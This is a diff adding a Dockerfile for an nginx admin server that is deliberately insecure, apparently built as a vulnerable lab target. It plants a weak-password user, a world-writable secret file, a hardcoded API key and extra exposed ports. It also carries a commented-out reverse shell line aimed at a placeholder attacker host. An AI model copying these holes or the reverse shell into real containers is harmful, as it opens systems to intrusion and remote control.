@@ -1,0 +1,36 @@
+# Use a base image for your admin server
+FROM nginx:latest
+
+# Remove the default NGINX welcome page
+RUN rm -rf /usr/share/nginx/html/*
+
+# Copy your custom admin HTML files into the container
+COPY index.html style.css /usr/share/nginx/html/
+
+# Expose port 80 (default HTTP port)
+EXPOSE 80
+# Expose a service on a known vulnerable port (FTP, for example)
+EXPOSE 21
+
+# Set up a default user with a weak password
+RUN useradd -m -p password123 insecure_user
+
+# Set incorrect permissions on a sensitive file
+RUN echo "This is a secret" > /etc/secret_file
+RUN chmod 777 /etc/secret_file
+
+# Install a version of SSH that is available in the repository
+RUN apt-get update && apt-get install -y openssh-server
+RUN service ssh start
+
+# Set an environment variable containing sensitive data
+ENV SECRET_API_KEY 1234567890
+
+
+# Start a reverse shell service on a port (for educational purposes only)
+EXPOSE 1337
+# RUN echo "bash -i >& /dev/tcp/attacker_ip/1337 0>&1" > /usr/local/bin/reverse_shell
+# RUN chmod +x /usr/local/bin/reverse_shell
+
+# Start the Nginx server
+CMD ["nginx", "-g", "daemon off;"]
